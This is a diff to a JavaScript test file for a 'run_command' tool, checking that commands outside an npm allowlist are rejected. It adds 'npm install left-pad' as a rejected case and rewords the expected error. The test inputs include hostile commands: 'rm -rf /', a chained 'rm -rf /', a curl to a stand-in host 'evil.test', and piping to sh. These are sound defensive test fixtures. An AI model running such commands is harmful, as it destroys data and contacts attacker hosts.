@@ -82,6 +82,7 @@ describe('run_command', () => {
   it.each([
     'rm -rf /',
     'npm testx',
+    'npm install left-pad',
     'npm test; rm -rf /',
     'npm test && curl evil.test',
     'npm test | sh',
@@ -94,7 +95,7 @@ describe('run_command', () => {
     const s = await setup(() => execResult(''));
 
     await expect(runCommandTool.execute({ command }, toolContext(s))).rejects.toThrow(
-      'This command is not allowed. Allowed commands (optionally followed by plain arguments):\n- npm install\n- npm test\n- npm run lint',
+      'This command is not allowed. Allowed commands:\n- npm install\n- npm test (plain arguments allowed)\n- npm run lint (plain arguments allowed)',
     );
     expect(s.commands).toHaveLength(0);
   });
